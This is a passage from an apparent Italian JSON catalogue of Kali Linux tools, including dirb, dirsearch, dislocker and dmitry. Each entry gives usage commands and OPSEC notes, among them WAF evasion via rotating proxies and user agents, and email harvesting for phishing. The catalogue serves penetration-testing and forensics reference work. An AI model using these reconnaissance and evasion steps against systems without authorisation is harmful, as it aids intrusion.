L'uso di output multipli aumenta ulteriormente il carico. E fondamentale utilizzare sempre il flag <code>-r</code> (read-only) per evitare scritture accidentali sul dispositivo sorgente.</p><p><strong>Mitigazioni:</strong> Lavorare sempre su copie bit-for-bit e mai sul disco originale. Documentare ogni operazione con hash e log per la catena di custodia. Confrontare dcfldd con dc3dd per determinare quale offra le funzionalita piu adatte al caso specifico, poiche sono funzionalmente molto simili.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "05_Forensics",
      "Disk_Analysis"
    ],
    "notes": null
  },
  {
    "id": "detect-it-easy",
    "name": "detect-it-easy",
    "version": "3.10",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/detect-it-easy/",
    "desc": "Identifica packer, compilatori e protector su eseguibili PE, ELF, Mach-O.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Detect It Easy</strong> (DIE) e un potente strumento di analisi statica per l'identificazione del tipo di file, compilatore, linker, packer, cryptor e protector utilizzati nella creazione di un eseguibile. Supporta un'ampia gamma di formati binari tra cui PE (Windows), ELF (Linux), Mach-O (macOS), DEX (Android) e molti altri formati come archivi, immagini e documenti. DIE rappresenta il primo passo fondamentale nel workflow di reverse engineering: prima di aprire un binario in un disassembler come IDA Pro o Ghidra, e essenziale sapere se e packed o protetto, con quale compilatore e stato prodotto e quali librerie utilizza. Il tool offre sia un'interfaccia grafica intuitiva che un potente client da riga di comando (diec) per l'integrazione in pipeline automatizzate di analisi malware.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Identificazione compilatore e linguaggio:</strong> DIE riconosce centinaia di compilatori e linguaggi di programmazione inclusi Visual Studio (tutte le versioni), GCC, Clang, MinGW, Delphi, Borland C++, Go, Rust, Python (PyInstaller, py2exe), .NET, Java e molti altri. Le signature sono basate su pattern nel codice, nelle strutture PE e nei metadati del binario, permettendo identificazioni accurate anche quando i tool di build sono stati modificati.</p><p><strong>Rilevamento packer e protector:</strong> Il database di signature copre centinaia di packer commerciali e open-source tra cui UPX, ASPack, PECompact, Themida, VMProtect, Enigma Protector, Obsidium, MPRESS e molti altri. La modalita Deep Scan applica euristiche avanzate per identificare protezioni sconosciute o personalizzate che non corrispondono a signature note, analizzando l'entropia delle sezioni e i pattern di import.</p><p><strong>Database di signature estendibile con scripting:</strong> Le signature di DIE sono implementate come script JavaScript, rendendo il database completamente estendibile dall'utente. E possibile scrivere signature personalizzate per identificare packer proprietari, compilatori interni o pattern specifici di un'organizzazione. La community contribuisce attivamente con nuove signature attraverso il repository GitHub ufficiale.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>DIE offre sia l'interfaccia grafica (<code>die</code>) per analisi interattiva sia il client CLI (<code>diec</code>) per automazione e scripting. L'output fornisce informazioni strutturate su ogni componente identificata nel binario.</p><pre><code># Analisi rapida da CLI\ndiec malware.exe\n\n# Output dettagliato con deep scan\ndiec -d malware.exe\n\n# Analisi ricorsiva di una directory di sample\ndiec -r /path/to/samples/\n\n# Output in formato JSON per parsing automatizzato\ndiec -j malware.exe\n\n# Analisi di un file ELF Linux\ndiec suspicious_binary\n\n# Avvio interfaccia grafica\ndie malware.exe</code></pre><p>Nell'interfaccia grafica e possibile esplorare le sezioni del binario, visualizzare l'entropia per identificare dati cifrati o compressi e navigare le strutture del file header in modo interattivo.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Nel workflow di <strong>Malware Analysis</strong>, DIE e il primo tool da utilizzare su ogni sample: se il binario risulta packed con UPX o VMProtect, sara necessario eseguire l'unpacking prima di procedere con l'analisi statica nel disassembler. In contesti <strong>CTF e Reverse Engineering</strong>, l'identificazione rapida del linguaggio e del compilatore orienta l'approccio: un binario Go richiede strategie diverse da uno C++ o .NET. Per la <strong>Vulnerability Research</strong>, conoscere le protezioni attive (ASLR, DEP, stack canary) e il compilatore permette di valutare la superficie di attacco e le tecniche di exploitation applicabili.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> DIE e un tool di analisi completamente statico che non esegue il sample analizzato. Non genera traffico di rete ne modifica il filesystem oltre ai propri file di log. E sicuro da utilizzare su malware senza rischio di infezione.</p><p><strong>Impatto operativo:</strong> L'analisi e rapida e a basso impatto computazionale anche su grandi volumi di sample. La modalita ricorsiva con deep scan puo richiedere piu tempo su directory con migliaia di file, ma non presenta rischi operativi.</p><p><strong>Mitigazioni:</strong> Per analisi su sample potenzialmente pericolosi, eseguire sempre DIE in un ambiente isolato (VM o sandbox) come precauzione aggiuntiva. Verificare le identificazioni con tool complementari come Exeinfo PE o PEiD per conferma incrociata.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "03_Post_Exploitation",
      "Reverse_Engineering"
    ],
    "notes": null
  },
  {
    "id": "dex2jar",
    "name": "dex2jar",
    "version": "2.1~nightly",
    "icon": "../app/icons/dex2jar-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/dex2jar/",
    "desc": "Converte file DEX Android in JAR per analisi con decompiler Java.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Dex2jar</strong> e un insieme di strumenti per la conversione di file Dalvik Executable (DEX) di Android in file JAR contenenti bytecode Java standard. Il formato DEX e il formato nativo eseguito dalla Dalvik Virtual Machine e da ART (Android Runtime), e non e direttamente leggibile dai decompilatori Java tradizionali. Dex2jar risolve questo problema traducendo il bytecode Dalvik in bytecode JVM equivalente, permettendo di utilizzare i potenti decompilatori Java esistenti come JD-GUI, Procyon, CFR e Fernflower per ottenere codice sorgente leggibile. Questo workflow e stato per anni il metodo standard per l'analisi di applicazioni Android, e rimane utile in scenari specifici anche con l'avvento di tool piu moderni come jadx che combinano tutte le fasi in un unico passaggio.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Conversione DEX to JAR:</strong> Il tool principale <code>d2j-dex2jar</code> converte file classes.dex in archivi JAR contenenti classi Java compilate. La conversione gestisce le differenze architetturali tra il bytecode register-based di Dalvik e quello stack-based della JVM, producendo output che i decompilatori Java possono processare correttamente. Supporta anche multidex, dove un'app contiene piu file classes.dex.</p><p><strong>Supporto diretto per APK:</strong> Dex2jar puo accettare direttamente file APK come input, estraendo automaticamente il file classes.dex e procedendo alla conversione senza richiedere passaggi intermedi manuali. Questo semplifica il workflow per analisi rapide dove non e necessario ispezionare le risorse dell'APK separatamente.</p><p><strong>Tool ausiliari nel bundle:</strong> Il pacchetto include strumenti aggiuntivi come <code>d2j-jar2dex</code> per la conversione inversa (JAR to DEX), <code>d2j-apk-sign</code> per firmare APK modificati e <code>d2j-jar-access</code> per modificare i flag di accesso delle classi. Questi tool sono utili per il patching e la repackaging di applicazioni Android durante l'analisi di sicurezza.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Il workflow tipico prevede la conversione del file DEX o APK in JAR, seguita dall'apertura del JAR risultante in un decompilatore Java per l'analisi del codice sorgente ricostruito.</p><pre><code># Conversione di classes.dex in JAR\nd2j-dex2jar classes.dex -o output.jar\n\n# Conversione diretta da APK\nd2j-dex2jar app.apk -o app-dex2jar.jar\n\n# Apertura del JAR risultante con JD-GUI\njd-gui output.jar\n\n# Conversione inversa JAR to DEX\nd2j-jar2dex modified.jar -o classes.dex\n\n# Firma di un APK modificato\nd2j-apk-sign modified.apk -o signed.apk\n\n# Gestione di errori di conversione con force\nd2j-dex2jar --force classes.dex -o output.jar</code></pre><p>Il flag <code>--force</code> e utile quando il file DEX contiene bytecode non standard o offuscato che causerebbe errori durante la conversione normale.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Nel campo della <strong>Mobile Security</strong>, dex2jar rappresenta il workflow classico di analisi Android: estrarre l'APK dal dispositivo, convertirlo con dex2jar e analizzare il codice con JD-GUI per identificare vulnerabilita, hardcoded credentials o logiche di autenticazione deboli. Per la <strong>Malware Analysis</strong> su piattaforma Android, la conversione in Java facilita enormemente la comprensione della logica malevola, permettendo di identificare server C2, meccanismi di esfiltrazione dati e tecniche di persistenza. In scenari di <strong>App Patching</strong>, il workflow completo dex2jar (analisi) seguito da smali/baksmali (modifica) e apktool (rebuild) permette di modificare il comportamento di un'app per testing di sicurezza.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Dex2jar e un tool di analisi offline che non interagisce con dispositivi o reti. L'analisi avviene interamente sul file locale senza generare traffico o lasciare tracce sul dispositivo sorgente.</p><p><strong>Impatto operativo:</strong> La conversione puo fallire su app fortemente offuscate con ProGuard, R8 o DexGuard, producendo codice Java difficile da leggere o incompleto. In questi casi, l'analisi del formato smali nativo tramite apktool puo essere piu produttiva.</p><p><strong>Mitigazioni:</strong> Per analisi moderne, considerare jadx come alternativa principale poiche converte APK direttamente in codice Java sorgente in un unico passaggio con risultati spesso migliori. Dex2jar resta utile quando jadx ha difficolta con specifiche versioni DEX o quando si necessita della conversione JAR intermedia per tool specifici.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Reverse_Engineering"
    ],
    "notes": null
  },
  {
    "id": "dirb",
    "name": "dirb",
    "version": "2.22",
    "icon": "../app/icons/dirb-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/dirb/",
    "desc": "Web content scanner per directory e file nascosti tramite dizionario.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>DIRB</strong> è uno scanner web che trova directory e file nascosti tramite attacco a dizionario. Testa sistematicamente URL costruiti da una wordlist contro il server web, identificando risorse non linkate pubblicamente ma comunque accessibili. È uno dei tool classici per web content discovery, predecessore di gobuster e feroxbuster.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Dictionary Attack:</strong> Prova ogni parola dalla wordlist come path sul server target.</p><p><strong>Extension Bruting:</strong> Può appendere estensioni (.php, .bak, .txt) a ogni path testato.</p><p><strong>Recursive Mode:</strong> Esplora ricorsivamente le directory trovate.</p><p><strong>Custom Headers:</strong> Supporta header custom, cookie e user agent.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Scansione con wordlist medium e estensioni multiple\ndirb http://target.com/ /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \\\n  -X .php,.asp,.aspx,.html,.bak,.old,.txt,.zip -o results.txt\n\n# Con header cookie per area autenticata\ndirb http://target.com/dashboard/ -H \"Cookie: session=abc123; auth=xyz\"\n\n# Ignorare warning SSL e timeout custom\ndirb https://target.com/ -w -t 120\n\n# User-agent custom per evasione\ndirb http://target.com/ -a \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0\"\n\n# Non ricorsivo (più veloce)\ndirb http://target.com/ -r\n\n# Basic auth\ndirb http://target.com/protected/ -u admin:password\n\n# Pipeline con altri tool\ndirb http://target.com/ -o dirs.txt &amp;&amp; \\\n  grep \"=&gt; DIRECTORY\" dirs.txt | awk '{print $1}' | xargs -I{} dirb {} -X .php</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per trovare <strong>Admin Panels</strong> nascosti (/admin, /manager, /wp-admin).</p><p>In <strong>Bug Bounty</strong>, scopre endpoint non documentati.</p><p>Per <strong>Backup Files</strong>, trova .bak, .old, .swp dimenticati che possono esporre codice sorgente.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Velocità:</strong> Più lento di gobuster/feroxbuster. Traffico riconoscibile da WAF. Usare delay se necessario.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Web",
      "Content_Discovery"
    ],
    "notes": null
  },
  {
    "id": "dirbuster",
    "name": "dirbuster",
    "version": "1.0",
    "icon": "../app/icons/dirbuster-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/dirbuster/",
    "desc": "GUI Java per brute force di directory e file web con threading.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>DirBuster</strong> e un'applicazione Java multi-threaded sviluppata da OWASP per il brute forcing di directory e nomi di file su server web e application server. Lo strumento e progettato per scoprire contenuti nascosti che non sono linkati nelle pagine visibili del sito: pannelli di amministrazione, file di backup, directory di configurazione, endpoint API non documentati e altre risorse che gli sviluppatori potrebbero aver lasciato accessibili involontariamente. DirBuster offre un'interfaccia grafica completa che permette di configurare, avviare, monitorare e analizzare gli scan in modo visuale, rendendolo particolarmente adatto a chi preferisce un approccio interattivo. Sebbene sia stato in gran parte superato da tool CLI piu moderni e veloci come gobuster, feroxbuster e dirsearch, DirBuster rimane un riferimento storico e uno strumento didattico eccellente.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Motore multi-threaded configurabile:</strong> DirBuster permette di configurare il numero di thread da utilizzare, da pochi thread per scan discreti fino a oltre 200 per massima velocita. L'interfaccia mostra in tempo reale il progresso dello scan, il numero di richieste al secondo, i risultati trovati e il tempo stimato rimanente, offrendo un controllo completo sull'operazione in corso.</p><p><strong>Wordlist integrate e modalita brute force puro:</strong> Lo strumento include diverse wordlist di dimensioni crescenti, dalla small (circa 20.000 entry) alla directory-list-2.3-big (oltre 1.2 milioni di entry). Oltre alle wordlist, DirBuster offre una modalita di brute force puro che genera tutte le combinazioni possibili di caratteri fino a una lunghezza specificata, utile per scoprire path con nomi non presenti in dizionari standard.</p><p><strong>Ricorsione e filtri per estensioni:</strong> Lo scan puo essere configurato per esplorare ricorsivamente le directory trovate, costruendo una mappa completa della struttura del sito. E possibile specificare estensioni di file da testare (php, asp, jsp, html, txt, bak) per ogni directory, e i risultati possono essere filtrati per codice di risposta HTTP per concentrarsi sui contenuti effettivamente accessibili.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>DirBuster si avvia come applicazione grafica Java. Il workflow tipico prevede la configurazione del target, la selezione della wordlist, l'impostazione dei parametri e il monitoraggio dei risultati in tempo reale.</p><pre><code># Avvio dell'interfaccia grafica\ndirbuster\n\n# Workflow nell'interfaccia:\n# 1. Inserire URL target (es. http://target.com:80/)\n# 2. Impostare numero di thread (default 10)\n# 3. Selezionare wordlist da /usr/share/dirbuster/wordlists/\n# 4. Configurare estensioni file (es. php,html,txt,bak)\n# 5. Click Start per avviare lo scan\n# 6. Monitorare tab Results - List View per i risultati\n# 7. Esportare i risultati in Report</code></pre><p>I risultati sono organizzati in una vista ad albero che mostra la struttura delle directory scoperte e in una lista che permette di ordinare per codice di risposta, dimensione e tipo. Il report finale puo essere esportato in formato testo o HTML.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>DirBuster e particolarmente utile per chi preferisce <strong>interfacce grafiche</strong> rispetto alla riga di comando, offrendo una visualizzazione immediata dei risultati e del progresso dello scan. In contesti di <strong>formazione e certificazioni</strong> come OSCP, viene spesso utilizzato come introduzione al concetto di content discovery prima di passare a tool CLI piu avanzati. Per <strong>scan di lunga durata</strong>, la GUI permette di monitorare il progresso, mettere in pausa e riprendere lo scan, funzionalita non sempre disponibili nei tool CLI equivalenti.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> DirBuster genera un volume massivo di richieste HTTP sequenziali con pattern facilmente identificabili. I WAF e gli IDS moderni hanno signature specifiche per rilevare scan DirBuster basati sull'User-Agent di default e sui pattern di richiesta.</p><p><strong>Impatto operativo:</strong> Un numero elevato di thread puo sovraccaricare server web poco performanti, causando denial of service involontario. Le wordlist grandi generano centinaia di migliaia di richieste che vengono registrate nei log del server.</p><p><strong>Mitigazioni:</strong> Ridurre il numero di thread per scan discreti. Utilizzare tool moderni come gobuster o feroxbuster che sono significativamente piu veloci e supportano proxy, custom headers e User-Agent personalizzabili per ridurre il footprint.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Web",
      "Content_Discovery"
    ],
    "notes": null
  },
  {
    "id": "dirsearch",
    "name": "dirsearch",
    "version": "0.4.3",
    "icon": "../app/icons/dirsearch-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/dirsearch/",
    "desc": "Brute forcer di directory web veloce con estensioni multiple e ricorsione.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Dirsearch e uno degli strumenti piu utilizzati per il web path bruteforcing, scritto in Python e mantenuto attivamente. Scopre risorse nascoste su server web (pannelli admin, file di backup, repository Git esposti, endpoint API) attraverso richieste HTTP basate su dizionari. Implementa meccanismi di rilevamento falsi positivi, supporto estensioni multiple, fuzzing ricorsivo e tecniche di evasione per operare contro server protetti da WAF. La velocita ottenuta tramite multi-threading e keep-alive lo rende ideale per assessment su larga scala.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>High Performance Multi-threaded:</strong> Gestisce decine di thread con connessioni keep-alive persistenti. Supporta HTTP/2, proxy SOCKS e ripresa di scansioni interrotte. Il motore asincrono processa migliaia di richieste al secondo mantenendo basso il consumo di risorse.</p><p><strong>Smart Response Filtering:</strong> Rileva pagine 404 personalizzate. Molti server restituiscono status 200 per risorse inesistenti; dirsearch analizza dimensione, contenuto e pattern delle risposte per filtrare automaticamente i falsi positivi.</p><p><strong>Extension Fuzzing e Ricorsione:</strong> Testa contemporaneamente multiple estensioni (.php, .asp, .bak, .old, .zip, .sql) per ogni path. La modalita ricorsiva entra nelle directory scoperte per trovare risorse annidate.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Scansione con estensioni comuni e configurazioni avanzate.</p><pre><code># Scansione base con estensioni php, html, txt\npython3 dirsearch.py -u https://target.com -e php,html,txt\n\n# Wordlist custom con delay e filtri status\npython3 dirsearch.py -u https://target.com -w /path/wordlist.txt -e * --delay 0.5 --exclude-status 403,500\n\n# Scansione ricorsiva profondita 3\npython3 dirsearch.py -u https://target.com -e php -r -R 3\n\n# Scansione multipla con output JSON\npython3 dirsearch.py -l targets.txt -e php,asp --format json -o results.json</code></pre><p>L'output puo essere esportato in JSON, CSV o testo per integrazione in pipeline automatizzate.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Discovery di risorse sensibili:</strong> In ogni Web Assessment dopo la ricognizione iniziale. Trovare db_backup.sql.zip, .git/ esposta o phpMyAdmin dimenticato offre un percorso diretto alla compromissione senza exploit complessi. Efficace contro ambienti di staging esposti accidentalmente.</p><p><strong>Mappatura superficie di attacco:</strong> Prima di scanner automatizzati, dirsearch mappa tutte le risorse raggiungibili. Endpoint di debug, file di log e backup dimenticati sono tra le scoperte piu critiche.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Genera migliaia di errori 404 in breve tempo. WAF come Cloudflare, AWS WAF e ModSecurity bloccano attivamente questo traffico dopo poche centinaia di richieste.</p><p><strong>Impatto operativo:</strong> Scansioni aggressive possono sovraccaricare server poco performanti. Fail2Ban interverra bloccando l'IP sorgente.</p><p><strong>Mitigazioni:</strong> Configurare delay adeguato (--delay), usare --random-agent, distribuire la scansione su piu IP tramite proxy rotanti. Con WAF, usare wordlist piccole e mirate.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Web",
      "Content_Discovery"
    ],
    "notes": null
  },
  {
    "id": "dislocker",
    "name": "dislocker",
    "version": "0.7.3",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/dislocker/",
    "desc": "Decritta volumi BitLocker usando recovery key, password o VMK.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Dislocker</strong> e uno strumento open-source che permette di accedere a volumi cifrati con Microsoft BitLocker da sistemi Linux e macOS. BitLocker e la soluzione di full-disk encryption integrata in Windows (edizioni Pro, Enterprise e Education) ed e sempre piu diffusa in ambienti aziendali grazie alle policy di sicurezza e alla gestione centralizzata tramite Active Directory e Microsoft Endpoint Manager. Dislocker supporta diversi metodi di autenticazione per sbloccare i volumi: recovery key a 48 cifre, password utente, file BEK (BitLocker Encryption Key) utilizzati come startup key su chiavette USB, oppure direttamente il VMK (Volume Master Key) o FVEK (Full Volume Encryption Key) se gia estratti tramite altri strumenti forensi. Una volta sbloccato, il volume viene presentato come file virtuale attraverso FUSE, montabile normalmente con il comando mount.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Supporto metodi di autenticazione multipli:</strong> Dislocker gestisce tutti i principali metodi di sblocco BitLocker. La recovery key a 48 cifre e il metodo piu comune in forensics, poiche spesso e salvata in Active Directory, nell'account Microsoft dell'utente o stampata su carta. Il supporto per file BEK permette di utilizzare startup key salvati su dispositivi USB, mentre l'input diretto di VMK/FVEK e utile quando la chiave e stata estratta dalla memoria RAM tramite tool come Volatility.</p><p><strong>Montaggio FUSE trasparente:</strong> Dopo la decrittazione, dislocker crea un file virtuale (<code>dislocker-file</code>) nella directory specificata che rappresenta il volume decrittato. Questo file puo essere montato con il comando standard <code>mount -o loop</code> come qualsiasi immagine disco, permettendo l'accesso trasparente al filesystem NTFS sottostante con tutti i tool forensi Linux standard.</p><p><strong>Supporto versioni BitLocker e modalita read-only:</strong> Dislocker supporta BitLocker nelle versioni di Windows da Vista in poi, inclusi i volumi BitLocker To Go per dispositivi rimovibili. La modalita read-only (flag <code>-r</code>) e fondamentale per il lavoro forense, garantendo che nessuna modifica venga scritta sul volume originale durante l'analisi.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Il workflow tipico prevede prima la decrittazione del volume con dislocker, poi il montaggio del file risultante per accedere al filesystem. E fondamentale utilizzare sempre il flag read-only in contesti forensi.</p><pre><code># Decrittazione con recovery key (48 cifre)\ndislocker -r -V /dev/sda2 -p123456-789012-345678-901234-567890-123456-789012-345678 -- /mnt/decrypted\n\n# Decrittazione con password utente\ndislocker -r -V /dev/sda2 -uMyBitLockerPassword -- /mnt/decrypted\n\n# Decrittazione con file BEK (startup key)\ndislocker -r -V /dev/sda2 -f /path/to/key.bek -- /mnt/decrypted\n\n# Montaggio del volume decrittato (read-only)\nmount -o loop,ro /mnt/decrypted/dislocker-file /mnt/windows\n\n# Workflow completo su immagine forense\nlosetup /dev/loop0 evidence.dd -o $((128*512))\ndislocker -r -V /dev/loop0 -p[recovery-key] -- /mnt/decrypted\nmount -o loop,ro /mnt/decrypted/dislocker-file /mnt/evidence</code></pre><p>L'offset per <code>losetup</code> dipende dalla struttura delle partizioni dell'immagine e puo essere determinato con <code>fdisk -l evidence.dd</code>.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In <strong>Digital Forensics</strong>, dislocker e essenziale quando si analizzano dischi sequestrati con BitLocker attivo e la recovery key e disponibile (frequentemente recuperata da Active Directory tramite il team IT o da backup dell'account Microsoft). Per l'<strong>Incident Response</strong>, permette di accedere rapidamente a sistemi compromessi con cifratura disco attiva senza dover avviare Windows, consentendo l'analisi forense da un ambiente Linux controllato. In scenari di <strong>Data Recovery</strong>, quando un'installazione Windows non si avvia piu ma la recovery key e nota, dislocker permette di recuperare i dati dal volume cifrato senza tentare riparazioni al sistema operativo.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> L'utilizzo di dislocker su un disco fisico collegato genera attivita I/O significativa. Su sistemi live (raro in forensics), l'accesso al volume cifrato potrebbe essere registrato nei log di Windows se il sistema e ancora operativo.</p><p><strong>Impatto operativo:</strong> Senza il flag <code>-r</code>, dislocker opera in modalita read-write e qualsiasi montaggio del volume potrebbe alterare timestamp e metadati del filesystem NTFS, compromettendo l'integrita delle evidenze. Questo e il rischio piu critico nell'uso forense di dislocker.</p><p><strong>Mitigazioni:</strong> Utilizzare SEMPRE il flag <code>-r</code> per la modalita read-only in contesti forensi. Lavorare esclusivamente su copie bit-for-bit dell'evidenza originale, mai sul disco fisico. Documentare hash e operazioni per la catena di custodia. Verificare la compatibilita con la versione specifica di BitLocker prima dell'operazione.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "05_Forensics",
      "Disk_Analysis"
    ],
    "notes": null
  },
  {
    "id": "dmitry",
    "name": "dmitry",
    "version": "1.3a",
    "icon": "../app/icons/dmitry-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/dmitry/",
    "desc": "Tool OSINT per whois, subdomain enum, email harvesting e port scan.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>DMitry</strong> (Deepmagic Information Gathering Tool) e un'utility a riga di comando all-in-one progettata per la raccolta rapida di informazioni su un dominio target. Lo strumento combina diverse tecniche di reconnaissance in un singolo eseguibile: interrogazioni WHOIS per informazioni di registrazione, ricerca di sottodomini tramite tecniche passive, estrazione di indirizzi email associati al dominio, raccolta di informazioni da Netcraft (uptime, sistema operativo, web server) e port scanning TCP di base. DMitry e stato sviluppato come tool leggero per ottenere una panoramica iniziale di un target senza dover configurare e lanciare multipli strumenti separati. Sebbene sia considerato un tool legacy rispetto alle alternative moderne come Amass, subfinder e theHarvester, rimane utile per reconnaissance rapida e come strumento didattico per comprendere le basi dell'information gathering.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>WHOIS Lookup approfondito:</strong> DMitry esegue interrogazioni WHOIS sia sull'indirizzo IP che sul nome di dominio, fornendo informazioni dettagliate sulla registrazione: registrant, contatti amministrativi e tecnici, nameserver, date di creazione e scadenza, e il registrar. Queste informazioni possono rivelare l'organizzazione proprietaria, la localizzazione geografica e le relazioni con altri domini registrati dalla stessa entita.</p><p><strong>Ricerca sottodomini ed email harvesting:</strong> Lo strumento cerca sottodomini utilizzando tecniche passive come interrogazioni a motori di ricerca e database pubblici. Contemporaneamente, estrae indirizzi email associati al dominio dai risultati trovati, costruendo un elenco di potenziali target per campagne di social engineering o phishing. Le informazioni da Netcraft aggiungono dettagli sull'infrastruttura come il tipo di web server e il sistema operativo.</p><p><strong>Port scanning TCP integrato:</strong> DMitry include un semplice scanner TCP connect che testa le porte piu comuni per identificare servizi attivi sul target. Sebbene non sia paragonabile a nmap per funzionalita e accuratezza, fornisce una visione rapida dei servizi esposti senza dover configurare uno scanner separato, utile per una panoramica iniziale durante la fase di reconnaissance.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>DMitry utilizza flag singoli per attivare le diverse modalita di raccolta informazioni. I flag possono essere combinati per eseguire tutte le operazioni in un singolo comando, e l'output puo essere salvato su file per analisi successive.</p><pre><code># Raccolta completa: whois IP, whois dominio, Netcraft, subdomain, email, port scan, output su file\ndmitry -winsepbo output.txt target.com\n\n# Solo whois e ricerca sottodomini\ndmitry -ws target.com\n\n# Solo email harvesting e informazioni Netcraft\ndmitry -ne target.com\n\n# Port scan sulle porte filtrate\ndmitry -p target.com -f\n\n# Whois dettagliato con output su file\ndmitry -winse target.com -o recon_results.txt</code></pre><p>I flag principali sono: <code>-w</code> (whois dominio), <code>-i</code> (whois IP), <code>-n</code> (Netcraft), <code>-s</code> (subdomain search), <code>-e</code> (email search), <code>-p</code> (port scan), <code>-b</code> (banner grabbing con -p), <code>-o</code> (output file).</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Quick Reconnaissance</strong> iniziale su un target, DMitry fornisce una panoramica rapida con un singolo comando che combina informazioni di registrazione, sottodomini, email e servizi attivi. In contesti di <strong>formazione e CTF</strong>, e uno strumento eccellente per insegnare le basi dell'information gathering, mostrando come diverse fonti di informazione contribuiscono a costruire un profilo del target. Per <strong>assessment rapidi</strong> dove il tempo e limitato, DMitry offre un punto di partenza immediato prima di passare a tool piu specializzati per approfondire le aree di interesse identificate.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Le interrogazioni WHOIS e DNS sono generalmente passive e non vengono rilevate dal target. Tuttavia, il port scan TCP genera connessioni dirette al target che vengono registrate nei log e possono essere rilevate da IDS/IPS. Le ricerche su motori di ricerca possono essere soggette a rate limiting.</p><p><strong>Impatto operativo:</strong> Il port scan e basato su TCP connect (non SYN scan), quindi stabilisce connessioni complete che sono facilmente loggabili. Il volume di traffico e ridotto rispetto a scanner dedicati, ma comunque rilevabile.</p><p><strong>Mitigazioni:</strong> Utilizzare DMitry senza il flag <code>-p</code> per limitarsi alla raccolta passiva. Per risultati piu completi e discreti, utilizzare tool moderni come Amass (subdomain enumeration), theHarvester (email harvesting) e nmap (port scanning) che offrono maggiore controllo sul footprint di rete.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "OSINT",
      "Domain_Intelligence",
      "Domain_Recon"
    ],
    "notes": null
  },
  {
    "id": "dnscat2",
    "name": "dnscat2",
    "version": "0.07",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/dnscat2/",
    "desc": "C2 e tunnel su DNS per comunicazioni nascoste in ambienti restrittivi.",
